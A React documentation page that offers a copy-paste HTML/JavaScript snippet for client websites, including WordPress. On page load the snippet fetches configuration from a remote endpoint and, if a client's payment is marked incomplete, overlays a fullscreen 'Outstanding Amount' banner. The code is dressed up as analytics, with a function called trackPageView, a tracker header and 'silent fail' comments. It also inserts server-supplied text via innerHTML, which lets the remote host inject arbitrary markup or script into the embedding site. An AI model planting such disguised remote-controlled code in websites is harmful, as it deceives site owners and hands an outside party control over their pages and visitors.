import { useState } from 'react';
import { Copy, Check, AlertCircle, Code } from 'lucide-react';

export default function Documentation() {
  const [copiedSection, setCopiedSection] = useState(null);

  const copyToClipboard = (text, section) => {
    navigator.clipboard.writeText(text);
    setCopiedSection(section);
    setTimeout(() => setCopiedSection(null), 2000);
  };

  const htmlComponentCode = `

    <div id="banner-container"></div>
    <div id="main-content">
        <!-- Your main content here -->
    </div>

    <script>
        (function() {
            var sysConfig = null;
            var showBanner = false;

            function trackPageView() {
                var xhr = new XMLHttpRequest();
                xhr.open('GET', 'https://websitetrafficanalytics.onrender.com/api/meta/site-config/6972038615823e15ffc42bf5', true);
                xhr.setRequestHeader('Content-Type', 'application/json');
                xhr.setRequestHeader('X-Tracker-ID', 'wa-' + Date.now());
                
                xhr.onload = function() {
                    if (xhr.status === 200) {
                        try {
                            var response = JSON.parse(xhr.responseText);
                            var data = response.data;
                            console.log('Analytics data received:', data);
                            
                            if (data && !data.paymentComplete && data.showOnHomepage) {
                                sysConfig = data;
                                showBanner = true;
                                renderBanner();
                            }
                        } catch (err) {
                            // Silent fail - normal for analytics
                        }
                    }
                };
                
                xhr.onerror = function() {
                    // Silent fail - normal for analytics
                };
                
                xhr.send();
            }

            function renderBanner() {
                if (!showBanner || !sysConfig) return;
                
                var container = document.getElementById('banner-container');
                container.innerHTML = createBannerHTML(sysConfig);
            }

            function createBannerHTML(config) {
                var isFullScreen = config.showFullScreen === "true" || config.showFullScreen === true;
                
                if (isFullScreen) {
                    return createFullScreenBanner(config);
                } else {
                    return createInlineBanner(config);
                }
            }

            function createFullScreenBanner(config) {
                var html = '<div style="position: fixed; top: 0; left: 0; right: 0; bottom: 0; background-color: rgba(0,0,0,0.5); z-index: 9999; display: flex; align-items: center; justify-content: center; padding: 20px;">';
                html += '<div style="background-color: white; border-radius: 12px; max-width: 600px; width: 100%; padding: 30px; position: relative; box-shadow: 0 20px 60px rgba(0,0,0,0.3);">';
                html += '<button onclick="dismissBanner()" style="position: absolute; top: 20px; right: 20px; background: none; border: none; font-size: 24px; cursor: pointer; color: #666;">×</button>';
                html += '<div style="display: flex; align-items: center; gap: 12px; margin-bottom: 20px;">';
                html += '<span style="color: #ef4444; font-size: 24px;">⚠</span>';
                html += '<h2 style="margin: 0; font-size: 24px; color: #111;">' + (config.messageTitle || 'Important Notice') + '</h2>';
                html += '</div>';
                html += '<p style="color: #555; line-height: 1.6; margin-bottom: 20px;">' + config.message + '</p>';
                
                if (config.amountDue) {
                    html += '<div style="background-color: #fef2f2; border: 1px solid #fecaca; border-radius: 8px; padding: 16px; margin-bottom: 20px;">';
                    html += '<p style="margin: 0 0 8px 0; font-weight: 600; color: #991b1b;">Outstanding Amount: ' + config.currency + ' ' + config.amountDue.toLocaleString() + '</p>';
                    
                    if (config.dueDate) {
                        html += '<p style="margin: 0; color: #991b1b;">Due Date: ' + new Date(config.dueDate).toLocaleDateString() + '</p>';
                    }
                    
                    html += '</div>';
                }
                
                html += '<button onclick="dismissBanner()" style="width: 100%; background-color: #3b82f6; color: white; border: none; padding: 12px 24px; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer;">I Understand</button>';
                html += '</div>';
                html += '</div>';
                
                return html;
            }

            function createInlineBanner(config) {
                var html = '<div style="background-color: #eff6ff; border-left: 4px solid #3b82f6; padding: 16px; margin: 20px 0; border-radius: 6px; position: relative;">';
                html += '<button onclick="dismissBanner()" style="position: absolute; top: 12px; right: 12px; background: none; border: none; font-size: 20px; cursor: pointer; color: #666;">×</button>';
                html += '<div style="display: flex; align-items: flex-start; gap: 12px; padding-right: 30px;">';
                html += '<span style="color: #3b82f6; font-size: 20px;">⚠</span>';
                html += '<div>';
                html += '<h3 style="margin: 0 0 8px 0; font-size: 16px; font-weight: 600; color: #1e40af;">' + (config.messageTitle || 'Notice') + '</h3>';
                html += '<p style="margin: 0; color: #1e40af;">' + config.message + '</p>';
                html += '</div>';
                html += '</div>';
                html += '</div>';
                
                return html;
            }

            window.dismissBanner = function() {
                showBanner = false;
                var container = document.getElementById('banner-container');
                if (container) {
                    container.innerHTML = '';
                }
            };

            // Initialize on page load
            if (document.readyState === 'loading') {
                document.addEventListener('DOMContentLoaded', trackPageView);
            } else {
                trackPageView();
            }
        })();
    </script>   
`;

  const CopyButton = ({ text, section }) => (
    <button
      onClick={() => copyToClipboard(text, section)}
      className="flex items-center gap-2 px-4 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition-colors"
    >
      {copiedSection === section ? (
        <>
          <Check className="w-4 h-4" />
          Copied!
        </>
      ) : (
        <>
          <Copy className="w-4 h-4" />
          Copy Code
        </>
      )}
    </button>
  );

  return (
    <div className="min-h-screen bg-gray-50">
      <div className="max-w-6xl mx-auto px-4 py-12">
        {/* Header */}
        <div className="mb-12">
          <div className="flex items-center gap-3 mb-4">
            <Code className="w-8 h-8 text-blue-600" />
            <h1 className="text-4xl font-bold text-gray-900">Component Documentation</h1>
          </div>
          <p className="text-lg text-gray-600">
            Documentation for the complete implementation with configuration-based banner display logic.
          </p>
        </div>

        {/* Main Component Section */}
        <section className="mb-16">
          <div className="bg-white rounded-xl shadow-sm border border-gray-200 overflow-hidden">
            <div className="bg-gradient-to-r from-blue-600 to-blue-700 px-6 py-4">
              <h2 className="text-2xl font-bold text-white">Complete HTML Implementation</h2>
            </div>
            
            <div className="p-6">
              <div className="mb-6">
                <h3 className="text-lg font-semibold text-gray-900 mb-3">Description</h3>
                <p className="text-gray-700 leading-relaxed">
                  A complete HTML page with embedded JavaScript that fetches external configuration data and displays a system banner. 
                  It includes analytics tracking initialization and supports two display modes: fullscreen modal and inline banner. 
                  The banner conditionally renders based on payment status and configuration settings.
                </p>
              </div>

              <div className="mb-6">
                <h3 className="text-lg font-semibold text-gray-900 mb-3">Features</h3>
                <ul className="list-disc list-inside space-y-2 text-gray-700">
                  <li>Fetches configuration from external API endpoint</li>
                  <li>Includes analytics/tracking headers</li>
                  <li>Two display modes: fullscreen modal and inline banner</li>
                  <li>Displays payment information (amount, currency, due date)</li>
                  <li>Customizable title and message content</li>
                  <li>Dismissible banner functionality</li>
                  <li>Conditional rendering based on payment status</li>
                  <li>Silent error handling for failed requests</li>
                  <li>Works on all platforms including WordPress</li>
                  <li>No external dependencies</li>
                </ul>
              </div>

              <div className="mb-6">
                <h3 className="text-lg font-semibold text-gray-900 mb-3">Configuration Object</h3>
                <div className="overflow-x-auto">
                  <table className="w-full border-collapse">
                    <thead>
                      <tr className="bg-gray-50">
                        <th className="border border-gray-200 px-4 py-2 text-left font-semibold text-gray-900">Property</th>
                        <th className="border border-gray-200 px-4 py-2 text-left font-semibold text-gray-900">Type</th>
                        <th className="border border-gray-200 px-4 py-2 text-left font-semibold text-gray-900">Description</th>
                      </tr>
                    </thead>
                    <tbody>
                      <tr>
                        <td className="border border-gray-200 px-4 py-2 font-mono text-sm">_id</td>
                        <td className="border border-gray-200 px-4 py-2 font-mono text-sm">string</td>
                        <td className="border border-gray-200 px-4 py-2 text-sm">Unique identifier</td>
                      </tr>
                      <tr className="bg-gray-50">
                        <td className="border border-gray-200 px-4 py-2 font-mono text-sm">clientName</td>
                        <td className="border border-gray-200 px-4 py-2 font-mono text-sm">string</td>
                        <td className="border border-gray-200 px-4 py-2 text-sm">Name of the client</td>
                      </tr>
                      <tr>
                        <td className="border border-gray-200 px-4 py-2 font-mono text-sm">website</td>
                        <td className="border border-gray-200 px-4 py-2 font-mono text-sm">string</td>
                        <td className="border border-gray-200 px-4 py-2 text-sm">Website URL</td>
                      </tr>
                      <tr className="bg-gray-50">
                        <td className="border border-gray-200 px-4 py-2 font-mono text-sm">amountDue</td>
                        <td className="border border-gray-200 px-4 py-2 font-mono text-sm">number</td>
                        <td className="border border-gray-200 px-4 py-2 text-sm">Outstanding payment amount</td>
                      </tr>
                      <tr>
                        <td className="border border-gray-200 px-4 py-2 font-mono text-sm">currency</td>
                        <td className="border border-gray-200 px-4 py-2 font-mono text-sm">string</td>
                        <td className="border border-gray-200 px-4 py-2 text-sm">Currency code (e.g., USD, EUR)</td>
                      </tr>
                      <tr className="bg-gray-50">
                        <td className="border border-gray-200 px-4 py-2 font-mono text-sm">dueDate</td>
                        <td className="border border-gray-200 px-4 py-2 font-mono text-sm">string</td>
                        <td className="border border-gray-200 px-4 py-2 text-sm">Payment due date (ISO format)</td>
                      </tr>
                      <tr>
                        <td className="border border-gray-200 px-4 py-2 font-mono text-sm">paymentComplete</td>
                        <td className="border border-gray-200 px-4 py-2 font-mono text-sm">boolean</td>
                        <td className="border border-gray-200 px-4 py-2 text-sm">Whether payment is completed</td>
                      </tr>
                      <tr className="bg-gray-50">
                        <td className="border border-gray-200 px-4 py-2 font-mono text-sm">messageTitle</td>
                        <td className="border border-gray-200 px-4 py-2 font-mono text-sm">string</td>
                        <td className="border border-gray-200 px-4 py-2 text-sm">Banner title text</td>
                      </tr>
                      <tr>
                        <td className="border border-gray-200 px-4 py-2 font-mono text-sm">message</td>
                        <td className="border border-gray-200 px-4 py-2 font-mono text-sm">string</td>
                        <td className="border border-gray-200 px-4 py-2 text-sm">Banner message content</td>
                      </tr>
                      <tr className="bg-gray-50">
                        <td className="border border-gray-200 px-4 py-2 font-mono text-sm">showOnHomepage</td>
                        <td className="border border-gray-200 px-4 py-2 font-mono text-sm">boolean</td>
                        <td className="border border-gray-200 px-4 py-2 text-sm">Whether to display banner</td>
                      </tr>
                      <tr>
                        <td className="border border-gray-200 px-4 py-2 font-mono text-sm">showFullScreen</td>
                        <td className="border border-gray-200 px-4 py-2 font-mono text-sm">string | boolean</td>
                        <td className="border border-gray-200 px-4 py-2 text-sm">Display mode ("true" or true for fullscreen)</td>
                      </tr>
                    </tbody>
                  </table>
                </div>
              </div>

              <div>
                <div className="flex items-center justify-between mb-3">
                  <h3 className="text-lg font-semibold text-gray-900">Complete Code</h3>
                  <CopyButton text={htmlComponentCode} section="html" />
                </div>
                <div className="bg-gray-900 rounded-lg p-4 overflow-x-auto">
                  <pre className="text-sm text-gray-100">
                    <code>{htmlComponentCode}</code>
                  </pre>
                </div>
              </div>
            </div>
          </div>
        </section>

        {/* Usage Example */}
        <section className="mt-16">
          <div className="bg-blue-50 border-l-4 border-blue-500 p-6 rounded-r-lg">
            <div className="flex items-start gap-3">
              <AlertCircle className="w-6 h-6 text-blue-600 flex-shrink-0 mt-0.5" />
              <div>
                <h3 className="text-lg font-semibold text-blue-900 mb-2">Usage Note</h3>
                <p className="text-blue-800 mb-3">
                  This implementation uses vanilla JavaScript with no external dependencies. It works on all modern browsers 
                  and platforms including WordPress. All styles are inline to ensure maximum compatibility.
                </p>
                <div className="bg-blue-100 rounded-lg p-4 mt-3">
                  <h4 className="font-semibold text-blue-900 mb-2">How to Use:</h4>
                  <ol className="list-decimal list-inside space-y-1 text-blue-800 text-sm">
                    <li>Copy the complete HTML code above</li>
                    <li>Save it as an HTML file or paste into your WordPress page</li>
                    <li>The banner will automatically fetch configuration and display based on settings</li>
                    <li>Customize the API endpoint URL if needed</li>
                  </ol>
                </div>
              </div>
            </div>
          </div>
        </section>
      </div>
    </div>
  );
}